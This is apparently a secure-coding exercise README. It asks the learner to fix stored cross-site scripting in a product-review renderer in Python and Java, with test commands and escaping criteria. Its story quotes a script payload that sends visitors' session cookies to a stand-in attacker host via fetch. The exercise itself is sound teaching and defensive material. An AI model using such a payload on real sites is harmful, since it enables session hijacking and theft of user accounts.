# 03 · The comment that ran code

**Time:** about 10 minutes · **Languages:** Python and Java · **Read first:** [Security](https://enrichmeai.com/well-rounded-engineer/security/) in the guide · **OWASP:** [A05:2025 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/), CWE-79 (cross-site scripting)

## The story

Product reviews show the reviewer's name and comment. One review's comment was `<script>fetch('https://evil.example/?c='+document.cookie)</script>`. Everyone who opened that product page sent their session cookie to a stranger.

## Before you start: predict

The comment is just text. At what moment does it become code, and whose browser runs it?

## Your task

Make `render_review(author, text)` (Java: `Reviews.render`) produce HTML in which the author and the text are always shown as text, never run as markup. Ordinary text must look the same as before.

```bash
cd python && python3 -m pytest -q
cd java && javac -d out *.java && java -cp out ReviewsTest
```

Or, from the top of the repo: `python3 practice.py check 03 --track security` (add `--java` for Java).

Stuck? `python3 practice.py hint 03 --track security`. The worked answer and why it works are in
[`solutions/security/03-comment-that-ran-code/`](../../solutions/security/03-comment-that-ran-code/). Try first.

## Done when

- `<`, `>`, `&`, `"` and `'` in a name or comment come out as `&lt;`, `&gt;`, `&amp;`, `&quot;` and `&#x27;`.
- A normal review renders exactly as before.

## Then

- Output encoding and the other layers (a Content Security Policy, HttpOnly cookies): [Security](https://enrichmeai.com/well-rounded-engineer/security/) in the guide, and the OWASP [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
- Try it with an agent: [the experiment in the track README](../README.md#try-it-with-an-agent).
